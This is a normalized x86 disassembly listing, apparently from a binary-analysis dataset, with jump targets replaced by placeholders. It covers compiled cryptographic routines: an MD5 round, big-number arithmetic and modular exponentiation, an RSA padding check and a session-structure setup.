mov ebx edx
not ebx
or ebx ecx
xor ebx esi
add ebx [ esp + 0x14 ]
lea eax [ ebx + eax - 0xbd6ddbc ]
rol eax 0x6
add eax ecx
mov ebx esi
not ebx
or ebx eax
xor ebx ecx
add ebx [ esp + 0x30 ]
lea edx [ ebx + edx + 0x432aff97 ]
rol edx 0xa
add edx eax
mov ebx ecx
not ebx
or ebx edx
xor ebx eax
add ebx [ esp + 0x4c ]
lea esi [ ebx + esi - 0x546bdc59 ]
rol esi 0xf
add esi edx
mov ebx eax
not ebx
or ebx esi
xor ebx edx
add ebx [ esp + 0x28 ]
lea ecx [ ebx + ecx - 0x36c5fc7 ]
ror ecx 0xb
add ecx esi
mov ebx edx
not ebx
or ebx ecx
xor ebx esi
add ebx [ esp + 0x44 ]
lea eax [ ebx + eax + 0x655b59c3 ]
rol eax 0x6
mov ebx esi
not ebx
add eax ecx
or ebx eax
xor ebx ecx
add ebx [ esp + 0x20 ]
lea edx [ ebx + edx - 0x70f3336e ]
rol edx 0xa
add edx eax
mov ebx ecx
not ebx
or ebx edx
xor ebx eax
add ebx [ esp + 0x3c ]
lea esi [ ebx + esi - 0x100b83 ]
rol esi 0xf
add esi edx
mov ebx eax
not ebx
or ebx esi
xor ebx edx
add ebx [ esp + 0x18 ]
lea ecx [ ebx + ecx - 0x7a7ba22f ]
ror ecx 0xb
add ecx esi
mov ebx edx
not ebx
or ebx ecx
xor ebx esi
add ebx [ esp + 0x34 ]
lea eax [ ebx + eax + 0x6fa87e4f ]
rol eax 0x6
add eax ecx
mov ebx esi
not ebx
or ebx eax
xor ebx ecx
add ebx [ esp + 0x50 ]
lea edx [ ebx + edx - 0x1d31920 ]
rol edx 0xa
add edx eax
mov ebx ecx
not ebx
or ebx edx
xor ebx eax
add ebx [ esp + 0x2c ]
lea esi [ ebx + esi - 0x5cfebcec ]
mov ebx eax
not ebx
rol esi 0xf
add esi edx
or ebx esi
xor ebx edx
add ebx [ esp + 0x48 ]
lea ecx [ ebx + ecx + 0x4e0811a1 ]
ror ecx 0xb
add ecx esi
mov ebx edx
not ebx
or ebx ecx
xor ebx esi
add ebx [ esp + 0x24 ]
lea eax [ ebx + eax - 0x8ac817e ]
rol eax 0x6
add eax ecx
mov ebx esi
not ebx
or ebx eax
xor ebx ecx
add ebx [ esp + 0x40 ]
lea edx [ ebx + edx - 0x42c50dcb ]
rol edx 0xa
add edx eax
mov ebx ecx
not ebx
or ebx edx
xor ebx eax
add ebx [ esp + 0x1c ]
lea esi [ ebx + esi + 0x2ad7d2bb ]
mov ebx [ edi ]
add ebx eax
rol esi 0xf
not eax
add esi edx
or eax esi
xor eax edx
add eax [ esp + 0x38 ]
mov [ edi ] ebx
lea eax [ eax + ecx - 0x14792c6f ]
ror eax 0xb
add eax [ edi + 0x4 ]
add eax esi
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
add eax esi
mov [ edi + 0x8 ] eax
mov eax [ edi + 0xc ]
pop esi
add eax edx
pop ebp
mov [ edi + 0xc ] eax
pop ebx
add esp 0x48
retn
sub_42f9c0
push esi
add eax 0x2
mov edx 0x10
push edi
lea ebx [ ebx ]
movzx esi [ eax + 0x1 ]
movzx edi [ eax ]
shl esi 0x8
or esi edi
movzx edi [ eax - 0x1 ]
shl esi 0x8
or esi edi
movzx edi [ eax - 0x2 ]
shl esi 0x8
or esi edi
mov [ ecx ] esi
add ecx 0x4
add eax 0x4
sub edx 0x1
jne r-xdata
pop edi
pop esi
retn
sub_42fa00
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
movzx eax [ ecx ]
add eax 0x7
cdq
and edx 0x7
push ebp
mov ebp [ esp + 0x90 ]
add eax edx
push esi
mov esi eax
sar esi 0x3
cmp edi esi
jbe r-xdata
push ecx
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0xa4 ]
mov eax edi
call sub_42fb00
add esp 0xc
test eax eax
jne r-xdata
pop esi
mov eax 0x406
pop ebp
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_43f96b
add esp 0x88
retn
mov ecx [ esp + 0x8c ]
pop esi
pop ebp
xor ecx esp
call sub_43f96b
add esp 0x88
retn
cmp [ esp + 0x8 ] esi
jne r-xdata
cmp [ esp + 0xc ] al
jne r-xdata
mov eax 0x401
cmp [ esp + 0xd ] 0x1
jne r-xdata
mov eax 0x2
lea ecx [ esi - 0x1 ]
cmp ecx eax
jbe r-xdata
mov dl [ esp + eax + 0xc ]
inc eax
test dl dl
jne r-xdata
mov dl 0xff
nop
mov ecx esi
sub ecx eax
lea edx [ ecx + 0xb ]
mov [ ebx ] ecx
cmp edx esi
ja r-xdata
inc eax
cmp eax ecx
jb r-xdata
lea eax [ esp + eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ esp + eax + 0xc ] dl
jne r-xdata
pop esi
xor eax eax
pop ebp
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_43f96b
add esp 0x88
retn
mov esi ebp
sub esi eax
lea ecx [ ecx ]
mov dl [ eax ]
mov [ esi + eax ] dl
inc eax
sub ecx 0x1
jne r-xdata
sub_42fb00
sub esp 0x210
push ebx
push ebp
mov ebp [ esp + 0x224 ]
push esi
push edi
lea ebx [ esp + 0x118 ]
call sub_42fc10
lea ecx [ ebp + 0x2 ]
mov eax 0x80
lea ebx [ esp + 0x10 ]
call sub_42fc10
lea ecx [ ebp + 0x82 ]
mov eax 0x80
lea ebx [ esp + 0x94 ]
call sub_42fc10
mov eax 0x20
lea ebx [ ebx ]
lea esi [ eax + 0x1 ]
mov eax 0x20
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
lea edi [ eax + 0x1 ]
mov eax esi
test esi esi
je r-xdata
mov edx eax
dec eax
test edx edx
jne r-xdata
cmp [ esp + eax * 4 + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x401
pop ebx
add esp 0x210
retn
mov ecx [ esp + eax * 4 + 0x114 ]
mov edx [ esp + eax * 4 + 0xc ]
dec eax
cmp ecx edx
ja r-xdata
cmp [ esp + eax * 4 + 0x94 ] 0x0
jne r-xdata
jb r-xdata
movzx eax [ ebp ]
mov ebx [ esp + 0x228 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ ebx ] eax
lea eax [ esp + 0x10 ]
push eax
push edi
lea ecx [ esp + 0x9c ]
push ecx
lea edx [ esp + 0x1a8 ]
push edx
mov eax esi
lea ecx [ esp + 0x128 ]
call sub_430290
mov ecx [ esp + 0x234 ]
push esi
lea eax [ esp + 0x1b0 ]
push eax
mov eax [ ebx ]
push ecx
call sub_42fc60
add esp 0x1c
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x210
retn
test eax eax
jne r-xdata
sub_42fc10
push ebp
push esi
push edi
xor esi esi
mov edi ecx
dec eax
cmp esi 0x21
jae r-xdata
xor edx edx
xor ecx ecx
pop edi
pop esi
pop ebp
retn
mov ecx 0x21
sub ecx esi
lea edi [ ebx + esi * 4 ]
xor eax eax
[ edi ]
mov [ ebx + esi * 4 ] edx
inc esi
cmp esi 0x21
jb r-xdata
movzx ebp [ eax + edi ]
shl ebp cl
dec eax
add ecx 0x8
or edx ebp
test eax eax
jge r-xdata
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn
cmp ecx 0x20
jae r-xdata
sub_42fc60
push ebx
push ebp
mov ebp [ esp + 0xc ]
xor edx edx
push esi
dec eax
push edi
cmp [ esp + 0x1c ] edx
jbe r-xdata
test eax eax
jl r-xdata
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub eax 0x1
mov [ eax + ebp + 0x1 ] 0x0
jns r-xdata
mov ecx [ esp + 0x18 ]
mov edi [ ecx + edx * 4 ]
xor esi esi
mov edi edi
inc edx
cmp edx [ esp + 0x1c ]
jb r-xdata
mov ecx esi
mov ebx edi
shr ebx cl
dec eax
add esi 0x8
mov [ eax + ebp + 0x1 ] bl
test eax eax
jge r-xdata
cmp esi 0x20
jae r-xdata
sub_42fcc0
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx eax
xor eax eax
push edi
mov edi ecx
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
push ebp
mov eax [ edx ]
or ebp 0xffffffff
sub ecx eax
sub ebp eax
add edx 0x4
cmp ecx ebp
jbe r-xdata
or ecx ecx
sub ecx [ edx ]
add edx 0x4
jmp r-xdata
xor eax eax
mov eax 0x1
jmp r-xdata
mov [ esi ] ecx
add esi 0x4
sub ebx 0x1
jne r-xdata
mov ecx [ edi ]
sub ecx eax
add edi 0x4
cmp ecx 0xffffffff
jne r-xdata
pop ebp
sub_42fd10
sub esp 0x134
push ebx
push esi
mov esi eax
push edi
lea edi [ esi + esi ]
mov ecx edi
xor ebx ebx
mov [ esp + 0x30 ] edi
lea eax [ esp + 0x38 ]
cmp ecx ebx
je r-xdata
cmp esi ebx
je r-xdata
mov edi edi
xor esi esi
mov [ esp + 0xc ] ebx
lea ecx [ esi - 0x1 ]
mov eax ecx
mov [ eax ] ebx
add eax 0x4
sub ecx 0x1
jne r-xdata
mov ecx edi
lea eax [ esp + 0x38 ]
cmp ecx ebx
je r-xdata
mov ecx [ esp + 0xc ]
push ebp
lea ebp [ esp + 0x3c ]
lea ecx [ esp + ecx * 4 + 0x3c ]
sub ebp edx
mov [ esp + 0x24 ] edx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x30 ] ebp
mov [ esp + 0x28 ] esi
jmp r-xdata
lea esi [ eax + 0x1 ]
mov eax ecx
mov esi eax
dec eax
test esi esi
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x134
retn
mov edx [ esp + 0x144 ]
mov esi eax
sub edx esi
lea esp [ esp ]
mov eax [ edx ]
mov [ esp + 0x18 ] ebx
cmp eax ebx
je r-xdata
inc eax
mov [ esp + 0xc ] eax
jmp r-xdata
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
cmp [ edx + eax * 4 ] ebx
jne r-xdata
mov esi [ eax ]
mov [ edx + eax ] esi
add eax 0x4
sub ecx 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
add [ ecx ] eax
add edx 0x4
add ecx 0x4
sub [ esp + 0x28 ] 0x1
mov [ esp + 0x24 ] edx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov [ esp + 0x14 ] ebx
cmp [ esp + 0x10 ] ebx
jbe r-xdata
cmp esi ebx
jbe r-xdata
mov ecx [ esp + 0x148 ]
cmp [ ecx + eax * 4 ] ebx
jne r-xdata
mov edi [ esp + 0x34 ]
pop ebp
mov ecx eax
movzx eax ax
shr ecx 0x10
mov [ esp + 0x2c ] ecx
mov [ esp + 0x20 ] eax
add ebp edx
jmp r-xdata
mov edx [ esp + 0x14c ]
mov eax [ esp + 0x14 ]
mov eax [ edx + eax * 4 ]
mov edx [ esp + 0x20 ]
movzx esi cx
mov ecx eax
shr ecx 0x10
movzx eax ax
movzx edi cx
imul edx eax
mov ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] ebx
imul ecx edi
movzx ebx si
imul eax ebx
mov esi ebx
imul esi edi
add eax ecx
mov edi 0x10000
cmp eax ecx
jb r-xdata
mov ecx eax
shl ecx 0x10
add edx ecx
shr eax 0x10
cmp edx ecx
jae r-xdata
mov edi [ esp + 0x38 ]
add eax edi
add esi eax
mov eax [ esp + 0x18 ]
add [ ebp ] eax
cmp [ ebp ] eax
sbb eax eax
add [ ebp ] edx
neg eax
cmp [ ebp ] edx
jae r-xdata
inc edi
add eax esi
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x14 ]
inc eax
add ebp 0x4
xor ebx ebx
mov [ esp + 0x14 ] eax
cmp eax [ esp + 0x10 ]
jb r-xdata
inc eax
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x1c ]
mov ebp [ esp + 0x30 ]
sub_42fed0
push ecx
push ebx
push edi
mov edi eax
xor eax eax
mov ebx ecx
cmp esi 0x20
jae r-xdata
pop edi
pop ebx
pop ecx
retn
cmp [ esp + 0x10 ] eax
je r-xdata
mov ecx 0x20
sub ecx esi
mov [ esp + 0x8 ] ecx
push ebp
xor eax eax
mov ecx [ esp + 0xc ]
shr edx cl
mov eax edx
jmp r-xdata
mov edx [ edi ]
mov ebp edx
mov ecx esi
shl ebp cl
add edi 0x4
add ebx 0x4
or ebp eax
mov [ ebx - 0x4 ] ebp
test esi esi
je r-xdata
pop ebp
sub [ esp + 0x14 ] 0x1
jne r-xdata
sub_42ff20
sub esp 0x8
push ebx
mov ebx eax
xor eax eax
push esi
mov esi ecx
cmp edi 0x20
jae r-xdata
pop esi
pop ebx
add esp 0x8
retn
test ebx ebx
je r-xdata
mov ecx 0x20
sub ecx edi
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x14 ]
sub ecx esi
push ebp
lea edx [ esi + ebx * 4 ]
mov [ esp + 0xc ] ecx
jmp r-xdata
mov esi [ ecx + edx - 0x4 ]
sub edx 0x4
mov ebp esi
mov ecx edi
shr ebp cl
dec ebx
or ebp eax
mov [ edx ] ebp
test edi edi
je r-xdata
xor eax eax
mov ecx [ esp + 0x10 ]
shl esi cl
mov eax esi
jmp r-xdata
mov ecx [ esp + 0xc ]
pop ebp
test ebx ebx
jne r-xdata
sub_42ff90
sub esp 0x1b8
push ebp
mov ebp [ esp + 0x1cc ]
push edi
mov edi eax
mov eax [ esp + 0x1d4 ]
test eax eax
je r-xdata
pop edi
pop ebp
add esp 0x1b8
retn
dec eax
push ebx
lea ebx [ eax + 0x1 ]
mov [ esp + 0x14 ] ebx
test ebx ebx
je r-xdata
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
pop ebx
mov ecx [ edi + ebx * 4 - 0x4 ]
xor eax eax
cmp [ edi + eax * 4 ] 0x0
jne r-xdata
push esi
mov esi 0x20
sub esi eax
mov [ esp + 0x2c ] esi
mov ecx ebx
lea eax [ esp + 0xbc ]
jmp r-xdata
inc eax
shr ecx 0x1
cmp eax 0x20
jb r-xdata
mov [ eax ] 0x0
add eax 0x4
sub ecx 0x1
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ esp + 0x1d4 ]
push ebp
lea ecx [ esp + 0xc0 ]
call sub_42fed0
mov [ esp + ebp * 4 + 0xc0 ] eax
push ebx
mov eax edi
lea ecx [ esp + 0x40 ]
call sub_42fed0
mov edx [ esp + ebx * 4 + 0x3c ]
mov edi [ esp + 0x1d4 ]
add esp 0x8
mov [ esp + 0x10 ] edx
mov ecx ebp
mov eax edi
test ebp ebp
je r-xdata
sub ebp ebx
mov eax ebp
mov [ esp + 0x24 ] eax
js r-xdata
nop
mov ecx [ esp + 0x1d0 ]
mov edx [ esp + 0x1dc ]
mov eax ecx
lea ecx [ ecx ]
lea ebp [ esp + eax * 4 + 0xbc ]
add ebx eax
mov eax edi
lea ecx [ esp + 0xbc ]
lea ebx [ esp + ebx * 4 + 0xbc ]
sub eax ecx
mov [ esp + 0x20 ] ebp
mov [ esp + 0x1c ] ebx
mov [ esp + 0x34 ] eax
jmp r-xdata
mov [ eax ] 0x0
add eax 0x4
sub ecx 0x1
jne r-xdata
mov [ eax ] 0x0
add eax 0x4
sub edx 0x1
jne r-xdata
lea edx [ esp + 0xbc ]
push edx
mov eax ebx
mov edi esi
call sub_42ff20
add esp 0x4
pop esi
cmp edx 0xffffffff
jne r-xdata
mov ebp [ ebx ]
mov ecx [ ebx - 0x4 ]
inc edx
mov esi edx
shr esi 0x10
mov eax 0xffff
cmp si ax
mov [ esp + 0x10 ] edx
mov [ esp + 0x28 ] esi
mov eax ebp
jne r-xdata
mov edi [ ebx ]
jmp r-xdata
movzx edi si
xor edx edx
inc edi
div edi
movzx edx ax
mov [ esp + 0x14 ] edx
mov eax edx
mov edx [ esp + 0x10 ]
shr eax 0x10
mov [ esp + 0x14 ] eax
jmp r-xdata
mov esi [ esp + 0x18 ]
lea edx [ esp + 0x38 ]
push edx
push ebp
mov eax esi
mov ecx edi
mov edx ebp
call sub_4304e0
add esp 0x8
shr edx 0x10
add edx [ esp + 0x30 ]
sub ebp edx
mov edx 0x1
dec ebp
movzx eax ax
movzx edi dx
movzx esi si
mov edx edi
imul edx eax
imul eax esi
mov [ esp + 0x30 ] eax
mov ebx edx
shl ebx 0x10
or eax 0xffffffff
sub ecx ebx
sub eax ebx
cmp ecx eax
jbe r-xdata
push ebp
mov eax esi
lea edx [ esp + 0x3c ]
mov ecx ebp
inc edi
call sub_42fcc0
add esp 0x4
jmp r-xdata
mov eax esi
mov esi ebp
lea ecx [ esp + 0x38 ]
sub esi ecx
mov eax edi
shl eax 0x10
or ebx 0xffffffff
sub ecx eax
sub ebx eax
cmp ecx ebx
jbe r-xdata
jne r-xdata
sub [ ebx ] eax
cmp [ ebx ] 0x0
jne r-xdata
mov esi [ esp + 0x18 ]
jb r-xdata
sub ebp esi
add [ esp + 0x14 ] edx
jmp r-xdata
sub ebp edx
mov edx 0xffff
cmp [ esp + 0x28 ] dx
jne r-xdata
mov eax edi
shl eax 0x10
cmp ecx eax
jb r-xdata
mov eax [ esp + 0x34 ]
mov [ eax + ebp ] edi
mov eax [ esp + 0x24 ]
dec eax
sub ebp 0x4
sub ebx 0x4
mov [ esp + 0x24 ] eax
mov [ esp + 0x20 ] ebp
mov [ esp + 0x1c ] ebx
test eax eax
jge r-xdata
test eax eax
jne r-xdata
cmp ebp esi
ja r-xdata
mov eax ecx
mov edx ebp
shl edx 0x10
shr eax 0x10
add eax edx
lea ebx [ esi + 0x1 ]
xor edx edx
div ebx
movzx ebx ax
movzx ebx bp
jmp r-xdata
mov edx [ esp + 0x10 ]
mov esi [ esp + 0x2c ]
mov ebx [ esp + 0x18 ]
dec eax
lea edx [ esi + eax * 4 ]
mov ecx [ esp + edx + 0x38 ]
mov edx [ esp + eax * 4 + 0x38 ]
cmp ecx edx
ja r-xdata
mov edx eax
shl edx 0x10
or esi 0xffffffff
sub ecx edx
sub esi edx
cmp ecx esi
jbe r-xdata
dec ebp
movzx eax bx
imul edi eax
imul eax esi
or edx 0xffffffff
sub ecx edi
sub edx edi
cmp ecx edx
jbe r-xdata
shr eax 0x10
sub ebp eax
dec ebp
or edx 0xffffffff
sub ecx eax
sub edx eax
cmp ecx edx
jbe r-xdata
jne r-xdata
inc ebx
jmp r-xdata
dec ebp
movzx edi [ esp + 0x14 ]
mov ebp [ esp + 0x20 ]
movzx ecx bx
mov ebx [ esp + 0x1c ]
shl edi 0x10
add edi ecx
dec eax
mov [ esp + 0x10 ] eax
cmp ecx eax
jb r-xdata
mov eax [ esp + 0x10 ]
test ebp ebp
ja r-xdata
sub_430290
sub esp 0x4b0
push ebx
push ebp
mov ebp [ esp + 0x4c8 ]
push esi
mov esi eax
push edi
mov edi ecx
mov ecx esi
mov eax edi
test esi esi
je r-xdata
lea eax [ esp + 0x1c ]
push edi
push eax
mov eax esi
lea edx [ esp + 0x234 ]
call sub_42fd10
push esi
lea ebx [ esi + esi ]
push ebx
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x2c4 ]
push edx
lea eax [ esp + 0x13c ]
push eax
mov eax ebp
call sub_42ff90
lea ecx [ esp + 0x38 ]
push edi
push ecx
mov eax esi
lea edx [ esp + 0x2d4 ]
call sub_42fd10
push esi
push ebx
lea edx [ esp + 0x48 ]
push edx
lea eax [ esp + 0x364 ]
push eax
lea ecx [ esp + 0x158 ]
push ecx
mov eax ebp
call sub_42ff90
add esp 0x38
mov ecx esi
lea eax [ esp + 0x1c ]
test esi esi
je r-xdata
lea edx [ esp + 0x22c ]
sub edx edi
mov eax [ esp + 0x4cc ]
mov [ esp + 0x1c ] 0x1
test eax eax
je r-xdata
jmp r-xdata
mov ebx [ eax ]
mov [ edx + eax ] ebx
add eax 0x4
sub ecx 0x1
jne r-xdata
xor eax eax
dec eax
mov [ eax ] 0x0
add eax 0x4
sub ecx 0x1
jne r-xdata
lea eax [ esp + 0x1c ]
test esi esi
je r-xdata
mov eax [ esp + 0x4c8 ]
mov edi [ eax + ecx * 4 ]
mov eax 0x20
cmp ecx edx
jne r-xdata
inc eax
jmp r-xdata
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4b0
retn
mov ecx [ esp + 0x4c4 ]
mov edx eax
sub ecx edx
nop
dec eax
shr eax 0x1
inc eax
mov [ esp + 0x14 ] eax
nop
test edi 0xc0000000
jne r-xdata
lea edx [ eax - 0x1 ]
mov ecx edx
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] ecx
test ecx ecx
jl r-xdata
mov edx [ esp + 0x4c8 ]
cmp [ edx + eax * 4 ] 0x0
jne r-xdata
mov edx [ eax ]
mov [ ecx + eax ] edx
add eax 0x4
sub esi 0x1
jne r-xdata
add edi edi
add edi edi
sub [ esp + 0x14 ] 0x1
jne r-xdata
imul eax eax 0x84
lea edx [ esp + eax + 0x1a8 ]
push edx
lea eax [ esp + 0x128 ]
push eax
mov eax esi
lea edx [ esp + 0x24 ]
call sub_42fd10
push esi
push ebx
lea ecx [ esp + 0x134 ]
push ecx
lea edx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x3d0 ]
push eax
mov eax ebp
call sub_42ff90
add esp 0x1c
jmp r-xdata
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x128 ]
push edx
mov eax esi
mov edx ecx
call sub_42fd10
push esi
push ebx
lea eax [ esp + 0x134 ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x3d0 ]
push edx
mov eax ebp
call sub_42ff90
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x144 ]
push ecx
mov eax esi
lea edx [ esp + 0x40 ]
call sub_42fd10
push esi
push ebx
lea edx [ esp + 0x150 ]
push edx
lea eax [ esp + 0x4c ]
push eax
lea ecx [ esp + 0x3ec ]
push ecx
mov eax ebp
call sub_42ff90
mov eax edi
shr eax 0x1e
add esp 0x38
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
add edi edi
add edi edi
sub eax 0x2
test edi 0xc0000000
je r-xdata
test eax eax
jbe r-xdata
sub ecx 0x1
mov [ esp + 0x10 ] ecx
jns r-xdata
sub_4304e0
sub esp 0x1c
push ebx
mov ebx [ esp + 0x24 ]
push esi
push edi
mov edi eax
xor eax eax
mov esi edx
mov [ esp + 0xc ] eax
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x1c
retn
test edi edi
jbe r-xdata
movzx eax cx
mov edx ecx
mov ecx [ esp + 0x30 ]
mov [ esp + 0x10 ] eax
shr edx 0x10
sub ecx esi
mov eax esi
sub eax ebx
push ebp
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] edi
jmp r-xdata
mov esi [ esp + 0x14 ]
add eax ebx
mov ecx [ eax + ecx ]
movzx eax dx
mov edx ecx
shr edx 0x10
movzx ecx cx
movzx ebp dx
imul esi ecx
mov edx [ esp + 0x14 ]
movzx eax ax
imul edx ebp
imul ecx eax
mov edi eax
add ecx edx
imul edi ebp
cmp ecx edx
mov [ esp + 0x28 ] 0x0
mov edx 0x10000
jb r-xdata
mov eax ecx
shl eax 0x10
add esi eax
shr ecx 0x10
cmp esi eax
jae r-xdata
mov edx [ esp + 0x28 ]
add ecx edx
add edi ecx
mov ecx [ esp + 0x18 ]
lea eax [ ecx + ebx ]
mov eax [ eax ]
mov ecx [ esp + 0x10 ]
or edx 0xffffffff
sub eax ecx
sub edx ecx
cmp edx eax
sbb ecx ecx
mov [ ebx ] eax
sub [ ebx ] esi
mov eax [ ebx ]
or edx 0xffffffff
sub edx esi
neg ecx
cmp eax edx
jbe r-xdata
inc edx
add ecx edi
add ebx 0x4
sub [ esp + 0x1c ] 0x1
mov [ esp + 0x10 ] ecx
jne r-xdata
inc ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x18 ]
mov eax ecx
pop ebp
sub_4305e0
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
push ebx
xor ebx ebx
push esi
push 0x28c
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp + 0x18 ] ebx
mov [ ebp ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp + 0x1c ] r--data
mov [ ebp - 0x10 ] 0x28c
call sub_441c3d
mov esi eax
add esp 0x4
mov [ ebp - 0x18 ] esi
cmp esi ebx
je r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp + 0x20 ] esi
mov eax [ ebp + 0x20 ]
test eax eax
je r-xdata
push 0x28c
push ebx
push esi
call sub_443360
add esp 0xc
xor eax eax
pop esi
pop ebx
mov ecx [ ebp + 0x74 ]
xor ecx ebp
call sub_43f96b
add ebp 0x78
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x20 ]
mov edx [ ebp + 0x20 ]
mov eax 0xf4240
mov [ ecx + 0x264 ] eax
mov [ edx + 0x268 ] eax
mov eax [ ebp + 0x20 ]
push ebx
push eax
call sub_456adc
mov ecx [ ebp + 0x20 ]
add esp 0x8
test eax eax
je r-xdata
mov eax ecx
mov [ ebp + 0x4 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x20 ]
mov edx [ ecx + 0xac ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x20 ]
mov [ ebp + 0xc ] eax
cmp eax ebx
je r-xdata
mov edx [ ebp + 0x18 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x244 ] edx
mov edx [ ebp + 0x10 ]
mov [ eax + 0x248 ] ecx
mov [ eax + 0x24c ] edx
mov edx [ ebp + 0x20 ]
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x10 ]
mov [ edx + 0xac ] ebx
mov edx [ ebp + 0x18 ]
push eax
call sub_43b5e0
add esp 0x4
cmp edx ebx
je r-xdata
mov esi 0x20000
cmp [ ebp + 0x1c ] ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] ecx
mov ecx [ ebp ]
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] ecx
mov ecx [ eax + 0x24c ]
push edx
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x20 ]
or [ eax + 0x6c ] esi
xor eax eax
mov [ ebp + 0x14 ] eax
call sub_44120e
add esp 0x4
push eax
call ecx
add esp 0x8
jmp r-xdata
mov edx [ ebp + 0x20 ]
mov eax [ ebp + 0x20 ]
mov esi [ ebp + 0x20 ]
mov [ edx + 0xb0 ] 0x2000
mov ecx [ eax + 0xb0 ]
call sub_43b650
mov ecx [ ebp + 0x20 ]
mov edx [ ebp + 0x20 ]
mov [ ecx + 0xac ] eax
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x20 ]
mov [ edx + 0x94 ] sub_436ce0
mov edx [ ebp + 0x20 ]
mov esi [ ebp + 0x20 ]
mov [ eax + 0x98 ] sub_436d30
add esi 0x74
mov [ edx + 0x9c ] ecx
call sub_43cbd0
add eax 0x6
cmp eax 0x6
ja r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
je r-xdata
inc eax
mov [ ebp + 0x14 ] eax
cmp [ ecx ] bl
jne r-xdata
mov eax [ ebp + 0x20 ]
or [ eax + 0x6c ] esi
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x20 ]
push edx
mov ecx r--data
jmp [ eax * 4 + jump_table_4308d8 ]
push r--data
push r--data
lea edx [ ebp + 0x24 ]
push 0x50
push edx
call sub_4564b2
mov esi [ ebp + 0x20 ]
lea ecx [ ebp + 0x24 ]
call sub_43b800
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x20 ]
push ecx
mov ecx r--data
mov [ eax + 0x6c ] ebx
call sub_43b740
add esp 0x14
cmp [ eax ] 0x31
jne r-xdata
mov edx [ ebp + 0x1c ]
mov dl [ edx + eax ]
cmp dl [ eax + r--data ]
lea ecx [ eax + r--data ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x20 ]
push ebx
push ecx
call sub_456adc
add esp 0x8
test eax eax
je r-xdata
mov [ esi + 0x54 ] ebx
mov [ esi + 0x50 ] sub_437550
cmp [ esi + 0x4c ] ebx
je r-xdata
mov eax [ ebp + 0x20 ]
push eax
mov ecx r--data
jmp r-xdata
mov ecx [ ebp + 0x20 ]
push ecx
mov ecx r--data
jmp r-xdata
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x20 ]
mov edx [ eax + 0xac ]
mov eax [ ebp + 0x20 ]
mov [ ecx + 0x80 ] edx
mov ecx [ ebp + 0x20 ]
mov edx [ eax + 0xb0 ]
mov eax [ ebp + 0x20 ]
mov esi eax
mov [ ecx + 0x84 ] edx
mov [ ebp + 0x8 ] eax
cmp esi ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp [ eax + 0x2 ] 0x32
je r-xdata
mov eax [ ebp + 0x20 ]
test [ eax + 0x6c ] esi
je r-xdata
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x74 ]
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
add ebp 0x78
mov esp ebp
pop ebp
retn
call sub_44b173
mov [ esi + 0x14c ] ebx
mov ecx r--data
mov [ esi + 0x4c ] ebx
call sub_43b800
mov ecx r--data
call sub_43b800
call sub_43b740
add esp 0x4
push eax
push r--data
lea ecx [ ebp + 0x24 ]
